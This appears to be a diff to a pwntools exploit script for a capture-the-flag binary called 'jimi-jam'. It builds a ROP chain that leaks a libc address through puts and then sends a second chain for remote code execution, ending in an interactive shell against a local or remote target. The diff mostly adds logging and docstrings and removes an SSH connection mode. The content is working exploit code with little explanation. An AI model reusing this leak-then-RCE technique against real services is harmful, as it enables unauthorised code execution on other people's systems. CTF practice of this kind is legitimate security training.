@@ -5,9 +5,7 @@ import sys
 
 from pwn import *
 
-context.log_level = 'debug'
-#context.terminal = ['tmux', 'splitw', '-p', '75']
-#context.aslr = False
+context.log_level = 'info'
 
 BINARY = "./jimi-jam"
 LIB = "./libc.so.6"
@@ -18,6 +16,7 @@ GDB_COMMANDS = ['b main']
 
 
 def get_ropchain_leak():
+    """Returns the ropchain for leaking a libc address (puts)."""
     ropchain = [
         context.binary.address + 0x13a3,  # pop rdi; ret;
         context.binary.sym['puts'],
@@ -28,6 +27,7 @@ def get_ropchain_leak():
 
 
 def get_ropchain_rce(libc):
+    """Returns the ropchain for RCE."""
     ropchain = [
         libc.address + 0x162866,  # pop rdx; pop rbx; ret;
         0,
@@ -48,18 +48,21 @@ def exploit(p, mode, libc):
 
     p.recvuntil('JAIL\n')
 
+    log.info('Sending first ropchain (leak libc address)')
     payload = b'A'*16
     payload += get_ropchain_leak()
     p.sendline(payload)
 
     libc_leak = p.recvuntil('\n', drop=True)
-
     libc.address = u64(libc_leak.ljust(8, b'\0')) - libc.sym['puts']
     log.info(f'Libc @ address 0x{libc.address:x}')
 
+    log.info('Sending second ropchain (RCE)')
     payload = p64(context.binary.sym['ROPJAIL'] + 0x100)*2  # Set rbp
     payload += get_ropchain_rce(libc)
     p.sendline(payload)
+
+    p.recvuntil('JAIL\n')
 
     p.interactive()
 
@@ -108,12 +111,6 @@ def main():
 
     elif mode == "remote":
         p = remote(HOST, PORT)
-    elif mode == "ssh":
-        ssh_connection = ssh(host=HOST,
-                             user='username',
-                             port=1337,
-                             password='password')
-        p = ssh_connection.process('/path/to/binary', shell=True)
     else:
         print("Invalid mode")
         sys.exit(1)
